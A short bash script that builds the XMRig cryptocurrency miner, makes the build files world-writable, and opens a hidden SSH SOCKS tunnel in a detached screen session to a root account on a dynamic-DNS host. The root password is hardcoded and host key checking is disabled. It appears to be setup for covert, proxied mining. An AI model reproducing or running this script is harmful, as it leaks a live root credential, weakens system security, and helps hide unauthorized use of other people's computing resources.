#!/bin/bash
sudo apt-get update
sudo yes Y | sudo apt-get install git build-essential cmake automake libtool autoconf
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build && cd xmrig/scripts
./build_deps.sh && cd ../build
cmake .. -DXMRIG_DEPS=scripts/deps
make -j$(nproc)
sudo chmod 777 *
sudo apt install sshpass
sudo screen -d -m sshpass -p dramz68682021 ssh -o StrictHostKeyChecking=no -D 1997 root@congdao.ddns.net
cd xmrig/build
